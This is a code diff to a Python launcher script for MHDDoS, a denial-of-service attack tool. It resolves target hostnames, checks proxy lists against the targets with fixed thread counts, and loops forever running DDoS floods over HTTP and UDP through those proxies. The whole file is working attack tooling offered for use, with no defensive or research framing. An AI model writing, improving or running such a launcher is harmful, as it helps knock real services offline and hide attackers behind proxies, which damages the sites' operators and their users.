@@ -7,13 +7,15 @@ import subprocess
 import sys
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from socket import gethostbyname
 
 from MHDDoS.start import ProxyManager
 from PyRoxy import ProxyChecker
 from PyRoxy import ProxyType
+from yarl import URL
 
 
-def update_proxies(period, proxy_timeout, threads, targets):
+def update_proxies(period, proxy_timeout, targets):
     #  Avoid parsing proxies too often when restart happens
     if os.path.exists('files/proxies/proxies.txt'):
         last_update = os.path.getmtime('files/proxies/proxies.txt')
@@ -28,18 +30,18 @@ def update_proxies(period, proxy_timeout, threads, targets):
 
     CheckedProxies = []
     size = len(targets)
-    print(f'{len(Proxies):,} Proxies are getting checked, this may take awhile:')
+    print(f'{len(Proxies):,} Proxies are getting checked, this may take a while:')
 
     futures = []
     with ThreadPoolExecutor(size) as executor:
         for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
-            print(f'{len(chunk):,} Proxies are getting checked for {target}')
+            print(f'{len(chunk):,} Proxies are getting checked against {target}')
             futures.append(
                 executor.submit(
                     ProxyChecker.checkAll,
                     proxies=chunk,
                     timeout=proxy_timeout,
-                    threads=threads // size,
+                    threads=1000 // size,
                     url=target
                 )
             )
@@ -103,12 +105,24 @@ def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, deb
         p.wait()
 
 
+def resolve_target(target):
+    url = URL(target)
+    host = url.host
+    try:
+        host = gethostbyname(url.host)
+    except OSError:
+        exit(f'Cannot resolve hostname {host} - check URL and your connection')
+
+    return str(url.with_host(host))
+
+
 def start(total_threads, period, targets, rpc, udp_threads, http_methods, proxy_timeout, debug):
     os.chdir('MHDDoS')
+    targets = list(map(resolve_target, targets))
     no_proxies = all(target.lower().startswith('udp://') for target in targets)
     while True:
         if not no_proxies:
-            update_proxies(period, proxy_timeout, total_threads, targets)
+            update_proxies(period, proxy_timeout, targets)
         run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, debug)
 
 
